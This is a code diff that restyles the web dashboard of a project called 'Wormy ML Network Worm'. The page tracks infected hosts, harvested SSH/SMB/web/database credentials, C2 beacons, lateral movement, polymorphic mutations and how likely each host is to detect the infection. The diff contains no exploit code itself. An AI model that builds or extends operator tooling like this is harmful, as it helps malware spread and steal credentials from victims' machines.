@@ -229,234 +229,165 @@ class WebDashboard:
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Wormy ML Network Worm v3.0 - Dashboard</title>
+    <title>Wormy — Dashboard</title>
     <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
     <style>
+        :root {
+            --bg: #09090b; --surface: #18181b; --border: #27272a;
+            --text: #fafafa; --muted: #a1a1aa; --accent: #22c55e;
+            --danger: #ef4444; --warn: #eab308; --info: #3b82f6;
+        }
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0a0e17; color: #e0e0e0; min-height: 100vh; }
-        .header { background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); padding: 20px 30px; border-bottom: 2px solid #0f3460; display: flex; justify-content: space-between; align-items: center; }
-        .header h1 { font-size: 1.8em; color: #00ff88; text-shadow: 0 0 10px rgba(0,255,136,0.3); }
-        .header .version { color: #888; font-size: 0.9em; }
-        .header .status-badge { padding: 8px 16px; border-radius: 20px; font-weight: bold; font-size: 0.9em; }
-        .status-running { background: #00ff88; color: #000; }
-        .status-stopped { background: #ff4444; color: #fff; }
-        .container { max-width: 1600px; margin: 0 auto; padding: 20px; }
-        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 15px; margin-bottom: 25px; }
-        .stat-card { background: #1a1a2e; border: 1px solid #2a2a4e; border-radius: 12px; padding: 20px; transition: all 0.3s ease; }
-        .stat-card:hover { border-color: #00ff88; box-shadow: 0 0 15px rgba(0,255,136,0.1); }
-        .stat-card .label { font-size: 0.85em; color: #888; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; }
-        .stat-card .value { font-size: 2em; font-weight: bold; color: #00ff88; }
-        .stat-card .sub { font-size: 0.8em; color: #666; margin-top: 4px; }
-        .panel { background: #1a1a2e; border: 1px solid #2a2a4e; border-radius: 12px; margin-bottom: 20px; overflow: hidden; }
-        .panel-header { background: #16213e; padding: 15px 20px; border-bottom: 1px solid #2a2a4e; display: flex; justify-content: space-between; align-items: center; }
-        .panel-header h2 { font-size: 1.1em; color: #00ff88; }
-        .panel-body { padding: 20px; max-height: 400px; overflow-y: auto; }
-        .charts-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px; }
-        @media (max-width: 1000px) { .charts-grid { grid-template-columns: 1fr; } }
-        .chart-container { background: #1a1a2e; border: 1px solid #2a2a4e; border-radius: 12px; padding: 20px; }
-        .chart-container h3 { color: #00ff88; margin-bottom: 15px; font-size: 1em; }
-        table { width: 100%; border-collapse: collapse; }
-        th, td { padding: 10px 15px; text-align: left; border-bottom: 1px solid #2a2a4e; }
-        th { color: #888; font-size: 0.85em; text-transform: uppercase; letter-spacing: 1px; }
-        td { font-size: 0.9em; }
-        .status-infected { color: #00ff88; }
-        .status-failed { color: #ff4444; }
-        .status-discovered { color: #4488ff; }
-        .severity-CRITICAL { color: #ff0044; font-weight: bold; }
-        .severity-HIGH { color: #ff6600; }
-        .severity-MEDIUM { color: #ffcc00; }
-        .severity-LOW { color: #44ff44; }
-        .activity-item { padding: 8px 0; border-bottom: 1px solid #2a2a4e; display: flex; gap: 15px; align-items: center; }
-        .activity-time { color: #666; font-size: 0.85em; min-width: 80px; }
-        .activity-type { padding: 3px 8px; border-radius: 4px; font-size: 0.8em; min-width: 100px; text-align: center; }
-        .activity-host { color: #4488ff; min-width: 140px; }
-        .activity-details { color: #ccc; }
-        .refresh-btn { background: #0f3460; border: 1px solid #00ff88; color: #00ff88; padding: 8px 16px; border-radius: 6px; cursor: pointer; font-size: 0.85em; transition: all 0.3s; }
-        .refresh-btn:hover { background: #00ff88; color: #000; }
-        ::-webkit-scrollbar { width: 8px; }
-        ::-webkit-scrollbar-track { background: #0a0e17; }
-        ::-webkit-scrollbar-thumb { background: #2a2a4e; border-radius: 4px; }
-        ::-webkit-scrollbar-thumb:hover { background: #00ff88; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Inter', 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; }
+        .topbar { display: flex; justify-content: space-between; align-items: center; padding: 16px 24px; border-bottom: 1px solid var(--border); background: var(--surface); }
+        .topbar h1 { font-size: 1.1rem; font-weight: 600; letter-spacing: -0.02em; }
+        .topbar h1 span { color: var(--accent); }
+        .topbar-right { display: flex; align-items: center; gap: 12px; }
+        .badge { padding: 4px 10px; border-radius: 9999px; font-size: 0.75rem; font-weight: 500; text-transform: uppercase; letter-spacing: 0.05em; }
+        .badge-green { background: #22c55e22; color: var(--accent); border: 1px solid #22c55e44; }
+        .badge-red { background: #ef444422; color: var(--danger); border: 1px solid #ef444444; }
+        .btn { background: var(--surface); border: 1px solid var(--border); color: var(--text); padding: 6px 14px; border-radius: 6px; cursor: pointer; font-size: 0.8rem; transition: all 0.15s; }
+        .btn:hover { border-color: var(--accent); color: var(--accent); }
+        .container { max-width: 1400px; margin: 0 auto; padding: 24px; }
+        .stat-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 12px; margin-bottom: 24px; }
+        .stat { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 16px; }
+        .stat-label { font-size: 0.75rem; color: var(--muted); text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 6px; }
+        .stat-value { font-size: 1.5rem; font-weight: 600; color: var(--accent); }
+        .panel { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; margin-bottom: 16px; }
+        .panel-head { padding: 12px 16px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
+        .panel-head h2 { font-size: 0.85rem; font-weight: 500; }
+        .panel-body { padding: 16px; }
+        .charts { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 16px; }
+        @media (max-width: 900px) { .charts { grid-template-columns: 1fr; } }
+        .chart-box { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 16px; }
+        .chart-box h3 { font-size: 0.8rem; font-weight: 500; margin-bottom: 12px; color: var(--muted); }
+        table { width: 100%; border-collapse: collapse; font-size: 0.8rem; }
+        th { text-align: left; padding: 8px 12px; color: var(--muted); font-weight: 500; border-bottom: 1px solid var(--border); text-transform: uppercase; letter-spacing: 0.05em; font-size: 0.7rem; }
+        td { padding: 8px 12px; border-bottom: 1px solid var(--border); }
+        tr:last-child td { border-bottom: none; }
+        .dot { display: inline-block; width: 6px; height: 6px; border-radius: 50%; margin-right: 6px; }
+        .dot-green { background: var(--accent); }
+        .dot-red { background: var(--danger); }
+        .dot-blue { background: var(--info); }
+        .sev { padding: 2px 6px; border-radius: 4px; font-size: 0.7rem; font-weight: 500; }
+        .sev-CRITICAL { background: #ef444422; color: var(--danger); }
+        .sev-HIGH { background: #f9731622; color: #f97316; }
+        .sev-MEDIUM { background: #eab30822; color: var(--warn); }
+        .sev-LOW { background: #22c55e22; color: var(--accent); }
+        .activity { display: flex; gap: 12px; padding: 8px 0; border-bottom: 1px solid var(--border); font-size: 0.8rem; align-items: center; }
+        .activity:last-child { border-bottom: none; }
+        .activity-time { color: var(--muted); font-family: 'SF Mono', 'Fira Code', monospace; font-size: 0.75rem; min-width: 65px; }
+        .activity-type { padding: 2px 8px; border-radius: 4px; background: var(--border); color: var(--accent); font-size: 0.7rem; min-width: 90px; text-align: center; }
+        .activity-host { color: var(--info); min-width: 130px; font-family: 'SF Mono', 'Fira Code', monospace; font-size: 0.75rem; }
+        .activity-details { color: var(--muted); }
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: var(--bg); }
+        ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
     </style>
 </head>
 <body>
-    <div class="header">
-        <div>
-            <h1>🐛 Wormy ML Network Worm</h1>
-            <span class="version">v3.0 - Developed by Ruby570bocadito</span>
-        </div>
-        <div style="display:flex;gap:15px;align-items:center;">
-            <span class="status-badge status-running" id="status-badge">RUNNING</span>
-            <button class="refresh-btn" onclick="refreshAll()">🔄 Refresh</button>
+    <div class="topbar">
+        <h1><span>●</span> Wormy</h1>
+        <div class="topbar-right">
+            <span class="badge badge-green" id="status-badge">Running</span>
+            <button class="btn" onclick="refreshAll()">Refresh</button>
         </div>
     </div>
-
     <div class="container">
-        <!-- Stats Cards -->
-        <div class="stats-grid" id="stats-grid">
-            <div class="stat-card"><div class="label">Infected Hosts</div><div class="value" id="stat-infected">0</div></div>
-            <div class="stat-card"><div class="label">Discovered</div><div class="value" id="stat-discovered">0</div></div>
-            <div class="stat-card"><div class="label">Vulnerabilities</div><div class="value" id="stat-vulns">0</div></div>
-            <div class="stat-card"><div class="label">Exploit Chains</div><div class="value" id="stat-chains">0</div></div>
-            <div class="stat-card"><div class="label">Lateral Movement</div><div class="value" id="stat-lateral">0/0</div></div>
-            <div class="stat-card"><div class="label">Credentials</div><div class="value" id="stat-creds">0</div></div>
-            <div class="stat-card"><div class="label">C2 Beacons</div><div class="value" id="stat-c2">0</div></div>
-            <div class="stat-card"><div class="label">Mutations</div><div class="value" id="stat-poly">0</div></div>
+        <div class="stat-grid" id="stats-grid">
+            <div class="stat"><div class="stat-label">Infected</div><div class="stat-value" id="stat-infected">0</div></div>
+            <div class="stat"><div class="stat-label">Discovered</div><div class="stat-value" id="stat-discovered" style="color:var(--info)">0</div></div>
+            <div class="stat"><div class="stat-label">Vulnerabilities</div><div class="stat-value" id="stat-vulns" style="color:var(--danger)">0</div></div>
+            <div class="stat"><div class="stat-label">Exploit Chains</div><div class="stat-value" id="stat-chains">0</div></div>
+            <div class="stat"><div class="stat-label">Lateral Move</div><div class="stat-value" id="stat-lateral" style="font-size:1rem">0/0</div></div>
+            <div class="stat"><div class="stat-label">Credentials</div><div class="stat-value" id="stat-creds" style="color:var(--warn)">0</div></div>
+            <div class="stat"><div class="stat-label">C2 Beacons</div><div class="stat-value" id="stat-c2">0</div></div>
+            <div class="stat"><div class="stat-label">Mutations</div><div class="stat-value" id="stat-poly">0</div></div>
         </div>
-
-        <!-- Charts -->
-        <div class="charts-grid">
-            <div class="chart-container">
-                <h3>📊 Host Status Distribution</h3>
-                <canvas id="hostChart"></canvas>
-            </div>
-            <div class="chart-container">
-                <h3>📈 Propagation Progress</h3>
-                <canvas id="progressChart"></canvas>
-            </div>
-            <div class="chart-container">
-                <h3>⚠️ Vulnerability Severity</h3>
-                <canvas id="vulnChart"></canvas>
-            </div>
-            <div class="chart-container">
-                <h3>🔑 Credential Discovery</h3>
-                <canvas id="credChart"></canvas>
-            </div>
+        <div class="charts">
+            <div class="chart-box"><h3>Host Status</h3><canvas id="hostChart"></canvas></div>
+            <div class="chart-box"><h3>Propagation</h3><canvas id="progressChart"></canvas></div>
+            <div class="chart-box"><h3>Vulnerability Severity</h3><canvas id="vulnChart"></canvas></div>
+            <div class="chart-box"><h3>Credential Types</h3><canvas id="credChart"></canvas></div>
         </div>
-
-        <!-- Hosts Table -->
         <div class="panel">
-            <div class="panel-header"><h2>🖥️ Infected Hosts</h2><button class="refresh-btn" onclick="loadHosts()">Refresh</button></div>
-            <div class="panel-body">
-                <table>
-                    <thead><tr><th>IP</th><th>OS</th><th>Status</th><th>Health</th><th>Risk</th><th>Payload</th><th>Activities</th></tr></thead>
-                    <tbody id="hosts-tbody"></tbody>
-                </table>
+            <div class="panel-head"><h2>Hosts</h2></div>
+            <div class="panel-body" style="padding:0;overflow-x:auto;">
+                <table><thead><tr><th>IP</th><th>OS</th><th>Status</th><th>Health</th><th>Risk</th><th>Payload</th><th>Events</th></tr></thead><tbody id="hosts-tbody"></tbody></table>
             </div>
         </div>
-
-        <!-- Vulnerabilities Table -->
         <div class="panel">
-            <div class="panel-header"><h2>⚠️ Vulnerabilities</h2><button class="refresh-btn" onclick="loadVulns()">Refresh</button></div>
-            <div class="panel-body">
-                <table>
-                    <thead><tr><th>Host</th><th>Name</th><th>Severity</th><th>CVSS</th><th>CVE</th></tr></thead>
-                    <tbody id="vulns-tbody"></tbody>
-                </table>
+            <div class="panel-head"><h2>Vulnerabilities</h2></div>
+            <div class="panel-body" style="padding:0;overflow-x:auto;">
+                <table><thead><tr><th>Host</th><th>Name</th><th>Severity</th><th>CVSS</th><th>CVE</th></tr></thead><tbody id="vulns-tbody"></tbody></table>
             </div>
         </div>
-
-        <!-- Activity Feed -->
         <div class="panel">
-            <div class="panel-header"><h2>📋 Activity Feed</h2><button class="refresh-btn" onclick="loadActivity()">Refresh</button></div>
-            <div class="panel-body" id="activity-feed">
-                <p style="color:#666;">Loading activity...</p>
-            </div>
+            <div class="panel-head"><h2>Activity</h2></div>
+            <div class="panel-body" id="activity-feed" style="max-height:300px;overflow-y:auto;"></div>
         </div>
     </div>
-
     <script>
         let hostChart, progressChart, vulnChart, credChart;
         let progressHistory = [];
-
+        const cd = { responsive: true, plugins: { legend: { labels: { color: '#a1a1aa', font: { size: 11 } } } }, scales: { x: { ticks: { color: '#71717a' }, grid: { color: '#27272a' } }, y: { ticks: { color: '#71717a' }, grid: { color: '#27272a' } } } };
         function initCharts() {
-            const chartDefaults = {
-                responsive: true,
-                plugins: { legend: { labels: { color: '#c9d1d9' } } },
-                scales: {
-                    x: { ticks: { color: '#8b949e' }, grid: { color: '#21262d' } },
-                    y: { ticks: { color: '#8b949e' }, grid: { color: '#21262d' } }
-                }
-            };
-
-            hostChart = new Chart(document.getElementById('hostChart'), {
-                type: 'doughnut',
-                data: { labels: ['Infected', 'Discovered', 'Failed'], datasets: [{ data: [0, 0, 0], backgroundColor: ['#3fb950', '#58a6ff', '#f85149'], borderWidth: 0 }] },
-                options: { plugins: { legend: { position: 'bottom', labels: { color: '#c9d1d9' } } } }
-            });
-
-            progressChart = new Chart(document.getElementById('progressChart'), {
-                type: 'line',
-                data: { labels: [], datasets: [{ label: 'Infected', data: [], borderColor: '#3fb950', backgroundColor: '#3fb95022', fill: true, tension: 0.4 }] },
-                options: { ...chartDefaults, scales: { ...chartDefaults.scales, x: { ...chartDefaults.scales.x, display: false } } }
-            });
-
-            vulnChart = new Chart(document.getElementById('vulnChart'), {
-                type: 'bar',
-                data: { labels: ['Critical', 'High', 'Medium', 'Low'], datasets: [{ label: 'Vulnerabilities', data: [0, 0, 0, 0], backgroundColor: ['#ff0044', '#ff6600', '#ffcc00', '#44ff44'], borderWidth: 0 }] },
-                options: { ...chartDefaults, plugins: { legend: { display: false } } }
-            });
-
-            credChart = new Chart(document.getElementById('credChart'), {
-                type: 'bar',
-                data: { labels: ['SSH', 'SMB', 'Web', 'DB', 'Other'], datasets: [{ label: 'Credentials', data: [0, 0, 0, 0, 0], backgroundColor: ['#58a6ff', '#3fb950', '#d29922', '#a371f7', '#8b949e'], borderWidth: 0 }] },
-                options: { ...chartDefaults, plugins: { legend: { display: false } } }
-            });
+            hostChart = new Chart(document.getElementById('hostChart'), { type: 'doughnut', data: { labels: ['Infected', 'Discovered', 'Failed'], datasets: [{ data: [0,0,0], backgroundColor: ['#22c55e','#3b82f6','#ef4444'], borderWidth: 0, hoverOffset: 4 }] }, options: { cutout: '65%', plugins: { legend: { position: 'bottom', labels: { color: '#a1a1aa', padding: 16, font: { size: 11 } } } } } });
+            progressChart = new Chart(document.getElementById('progressChart'), { type: 'line', data: { labels: [], datasets: [{ label: 'Infected', data: [], borderColor: '#22c55e', backgroundColor: '#22c55e15', fill: true, tension: 0.4, pointRadius: 0, borderWidth: 2 }] }, options: { ...cd, scales: { ...cd.scales, x: { display: false }, y: { ...cd.scales.y, beginAtZero: true } }, plugins: { legend: { display: false } } } });
+            vulnChart = new Chart(document.getElementById('vulnChart'), { type: 'bar', data: { labels: ['Critical', 'High', 'Medium', 'Low'], datasets: [{ data: [0,0,0,0], backgroundColor: ['#ef4444','#f97316','#eab308','#22c55e'], borderRadius: 4, barPercentage: 0.6 }] }, options: { ...cd, plugins: { legend: { display: false } } } });
+            credChart = new Chart(document.getElementById('credChart'), { type: 'bar', data: { labels: ['SSH', 'SMB', 'Web', 'DB', 'Other'], datasets: [{ data: [0,0,0,0,0], backgroundColor: ['#3b82f6','#22c55e','#eab308','#a855f7','#71717a'], borderRadius: 4, barPercentage: 0.6 }] }, options: { ...cd, plugins: { legend: { display: false } } } });
         }
-
-        function updateCharts(stats) {
-            const infected = stats.infected_hosts || 0;
-            const discovered = stats.total_discovered || 0;
-            const failed = stats.failed_targets || 0;
-
-            hostChart.data.datasets[0].data = [infected, discovered - infected - failed, failed];
+        function updateCharts(s) {
+            hostChart.data.datasets[0].data = [s.infected_hosts||0, (s.total_discovered||0)-(s.infected_hosts||0)-(s.failed_targets||0), s.failed_targets||0];
             hostChart.update();
-
-            progressHistory.push(infected);
+            progressHistory.push(s.infected_hosts||0);
             if (progressHistory.length > 20) progressHistory.shift();
-            progressChart.data.labels = progressHistory.map((_, i) => i + 1);
+            progressChart.data.labels = progressHistory.map((_,i)=>i+1);
             progressChart.data.datasets[0].data = [...progressHistory];
             progressChart.update();
         }
-
         function refreshAll() {
-            fetch('/api/status').then(r => r.json()).then(data => {
-                document.getElementById('stat-infected').textContent = data.infected_hosts || 0;
-                document.getElementById('stat-discovered').textContent = data.total_discovered || 0;
-                document.getElementById('stat-vulns').textContent = data.vulnerabilities || 0;
-                document.getElementById('stat-chains').textContent = data.exploit_chains || 0;
-                document.getElementById('stat-lateral').textContent = data.lateral_movements || '0/0';
-                document.getElementById('stat-creds').textContent = data.credentials || 0;
-                document.getElementById('stat-c2').textContent = data.c2_beacons || 0;
-                document.getElementById('stat-poly').textContent = data.polymorphic_mutations || 0;
-                const badge = document.getElementById('status-badge');
-                badge.textContent = data.running ? 'RUNNING' : 'STOPPED';
-                badge.className = 'status-badge ' + (data.running ? 'status-running' : 'status-stopped');
-                updateCharts(data);
+            fetch('/api/status').then(r=>r.json()).then(d => {
+                document.getElementById('stat-infected').textContent = d.infected_hosts||0;
+                document.getElementById('stat-discovered').textContent = d.total_discovered||0;
+                document.getElementById('stat-vulns').textContent = d.vulnerabilities||0;
+                document.getElementById('stat-chains').textContent = d.exploit_chains||0;
+                document.getElementById('stat-lateral').textContent = d.lateral_movements||'0/0';
+                document.getElementById('stat-creds').textContent = d.credentials||0;
+                document.getElementById('stat-c2').textContent = d.c2_beacons||0;
+                document.getElementById('stat-poly').textContent = d.polymorphic_mutations||0;
+                const b = document.getElementById('status-badge');
+                b.textContent = d.running ? 'Running' : 'Stopped';
+                b.className = 'badge ' + (d.running ? 'badge-green' : 'badge-red');
+                updateCharts(d);
             });
-            loadHosts();
-            loadVulns();
-            loadActivity();
+            loadHosts(); loadVulns(); loadActivity();
         }
-
         function loadHosts() {
-            fetch('/api/hosts').then(r => r.json()).then(hosts => {
-                const tbody = document.getElementById('hosts-tbody');
-                if (!hosts.length) { tbody.innerHTML = '<tr><td colspan="7" style="color:#666;">No hosts yet</td></tr>'; return; }
-                tbody.innerHTML = hosts.map(h => `<tr><td style="color:#4488ff;">${h.ip}</td><td>${h.os}</td><td class="status-${h.status}">${h.status}</td><td>${h.health.toFixed(0)}%</td><td>${h.detection_risk.toFixed(0)}%</td><td>${h.payload_variant}</td><td>${h.activities}</td></tr>`).join('');
+            fetch('/api/hosts').then(r=>r.json()).then(h => {
+                const t = document.getElementById('hosts-tbody');
+                if (!h.length) { t.innerHTML = '<tr><td colspan="7" style="color:#71717a;padding:24px;text-align:center;">No hosts yet</td></tr>'; return; }
+                t.innerHTML = h.map(x => { const dot = x.status==='infected'?'green':x.status==='failed'?'red':'blue'; return `<tr><td style="font-family:'SF Mono','Fira Code',monospace;font-size:0.75rem;"><span class="dot dot-${dot}"></span>${x.ip}</td><td style="color:#a1a1aa;">${x.os}</td><td style="text-transform:capitalize;">${x.status}</td><td>${x.health.toFixed(0)}%</td><td>${x.detection_risk.toFixed(0)}%</td><td style="font-family:'SF Mono','Fira Code',monospace;font-size:0.75rem;">${x.payload_variant}</td><td>${x.activities}</td></tr>`; }).join('');
             });
         }
-
         function loadVulns() {
-            fetch('/api/vulnerabilities').then(r => r.json()).then(vulns => {
-                const tbody = document.getElementById('vulns-tbody');
-                if (!vulns.length) { tbody.innerHTML = '<tr><td colspan="5" style="color:#666;">No vulnerabilities found</td></tr>'; return; }
-                const sevCount = { CRITICAL: 0, HIGH: 0, MEDIUM: 0, LOW: 0 };
-                vulns.forEach(v => { if (sevCount[v.severity] !== undefined) sevCount[v.severity]++; });
-                vulnChart.data.datasets[0].data = [sevCount.CRITICAL, sevCount.HIGH, sevCount.MEDIUM, sevCount.LOW];
+            fetch('/api/vulnerabilities').then(r=>r.json()).then(v => {
+                const t = document.getElementById('vulns-tbody');
+                if (!v.length) { t.innerHTML = '<tr><td colspan="5" style="color:#71717a;padding:24px;text-align:center;">No vulnerabilities</td></tr>'; return; }
+                const sc = {CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0};
+                v.forEach(x => { if (sc[x.severity]!==undefined) sc[x.severity]++; });
+                vulnChart.data.datasets[0].data = [sc.CRITICAL,sc.HIGH,sc.MEDIUM,sc.LOW];
                 vulnChart.update();
-                tbody.innerHTML = vulns.slice(0, 20).map(v => `<tr><td style="color:#4488ff;">${v.host}</td><td>${v.name}</td><td class="severity-${v.severity}">${v.severity}</td><td>${v.cvss}</td><td>${v.cve}</td></tr>`).join('');
+                t.innerHTML = v.slice(0,20).map(x => `<tr><td style="font-family:'SF Mono','Fira Code',monospace;font-size:0.75rem;">${x.host}</td><td>${x.name}</td><td><span class="sev sev-${x.severity}">${x.severity}</span></td><td>${x.cvss}</td><td style="color:#71717a;">${x.cve}</td></tr>`).join('');
             });
         }
-
         function loadActivity() {
-            fetch('/api/activity').then(r => r.json()).then(activities => {
-                const feed = document.getElementById('activity-feed');
-                if (!activities.length) { feed.innerHTML = '<p style="color:#666;">No activity yet</p>'; return; }
-                feed.innerHTML = activities.slice(0, 30).map(a => `<div class="activity-item"><span class="activity-time">${a.timestamp ? a.timestamp.substring(11,19) : ''}</span><span class="activity-type" style="background:#16213e;color:#00ff88;">${a.type}</span><span class="activity-host">${a.host_ip || ''}</span><span class="activity-details">${a.details}</span></div>`).join('');
+            fetch('/api/activity').then(r=>r.json()).then(a => {
+                const f = document.getElementById('activity-feed');
+                if (!a.length) { f.innerHTML = '<p style="color:#71717a;padding:16px;text-align:center;">No activity yet</p>'; return; }
+                f.innerHTML = a.slice(0,30).map(x => `<div class="activity"><span class="activity-time">${x.timestamp?x.timestamp.substring(11,19):''}</span><span class="activity-type">${x.type}</span><span class="activity-host">${x.host_ip||''}</span><span class="activity-details">${x.details||''}</span></div>`).join('');
             });
         }
-
         setInterval(refreshAll, 5000);
         window.onload = () => { initCharts(); refreshAll(); };
     </script>
